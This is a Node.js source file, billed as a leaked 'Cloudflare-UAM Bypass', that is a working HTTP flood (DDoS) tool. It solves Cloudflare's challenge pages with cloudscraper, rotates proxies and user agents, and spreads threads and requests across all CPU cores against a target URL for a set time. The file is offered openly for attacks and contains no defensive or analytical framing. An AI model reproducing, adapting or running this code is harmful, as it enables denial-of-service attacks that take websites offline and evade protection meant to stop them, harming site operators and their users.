// Cloudflare-UAM Bypass Leak 
// Stop paying for this shit!

const scraper = require('cloudscraper');

const cluster = require('cluster');
const request = require('request');
const ciphers = require('ciphers');

const proc_count = require('os').cpus().length;
const fs = require('fs');

const args = require('minimist')(process.argv.slice(2));

//check if args are specified.

if(args['url'] == null)
{
	return console.log('URL must be specified using the --url argument.');
}
else if(args['proxyfile'] == null)
{
	return console.log('Proxy file path must be specified using the --proxyfile argument.');
}
else if(args['uafile'] == null)
{
	return console.log('User-agent file path must be specified using the --uafile argument.');
}
else if(args['threads'] == null)
{
	return console.log('The number of threads must be specified using the --threads argument.');
}
else if(args['requests'] == null)
{
	return console.log('The number of requests must be specified using the --requests argument.');
}
else if(args['seconds'] == null)
{
	return console.log('The number of seconds must be specified using the --seconds argument.');
}

//check if files exist.

if(!fs.existsSync(args['proxyfile']))
{
	return console.log('Proxy file does not exist.');
}

if(!fs.existsSync(args['uafile']))
{
	return console.log('UA file does not exist.');
}

if(!Number.isInteger(args['threads']))
{
	return console.log('Number of threads must be a number.');
}

if(!Number.isInteger(args['requests']))
{
	return console.log('Number of requests must be a number.');
}

if(!Number.isInteger(args['seconds']))
{
	return console.log('Number of seconds must be a number.');
}

//save files in array.

var proxy_counter = 0;

const proxies = fs.readFileSync(args['proxyfile'], 'utf-8').toString().split("\n");
const uas = fs.readFileSync(args['uafile'], 'utf-8').toString().split("\n");

function greater(first, second)
{
	if(first > second)
		return first;

	return second;
}

function attack(s_proxy)
{
	//for every specified thread.

	proxy_counter ++;

	var stop = false;

	for(var i = 0; i < args['threads']; i++)
	{
		if(stop == true)
			break;

		var p_proxy = s_proxy;

		if(!p_proxy.startsWith('https://') && !p_proxy.startsWith('http://'))
		{
			p_proxy = 'http://' + p_proxy;
		}

		for(var z = 0; z < args['requests']; z++)
		{
			if(stop == true)
				break;

			var options = {
				uri: args['url'],
				jar: request.jar(),
				proxy: p_proxy,
				headers: {
					'User-Agent': uas[Math.floor(Math.random() * uas.length)],
					'Cache-Control': 'private',
					'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'
				},
				cloudflareTimeout: 5000,
				cloudflareMaxTimeout: 6000,
				followAllRedirects: true,
				challengesToSolve: 3,
				decodeEmails: false,
				gzip: true,
				agentOptions: { ciphers }
			};

			scraper.get(options).then(function (htmlString) {
			
				console.log('[+] Request sent using proxy ' + s_proxy + '.');

			}).catch(function (err) {

				console.log('[-] Error sending request. Proxy is probably down.');
				
				stop = true;

			});
		}
	}
}

process.on('uncaughtException', err => {

    if (err.name === 'AssertionError') {
       
       console.log("[x] AssertionError");

    }


});

if(cluster.isMaster)
{
	console.log("[+] " + proxies.length + " proxies have been loaded.");
	console.log("[+] Process has been started for " + args['seconds'] + " seconds.");

	for(var i = 0; i < proc_count; i++)
	{
		let worker = cluster.fork();

		worker.send({ id: worker.id, proxy: proxies.splice(0, Math.ceil(proxies.length / proc_count)) });
	}

	cluster.on('exit', (worker, code, signal) => {
	    console.log(`Thread stopped working.`);
	    process.exit(1)
	});
}
else
{
	process.on('message', data => {
        
		data.proxy.forEach(async p => {

			//send request with proxy
			attack(p);

        });

    });

}

//time running
setTimeout(() => {
	console.log("[x] Attack is over bucko. Credits Aura Srxdv Phoenix");
    process.exit(1)
}, args['seconds'] * 1000);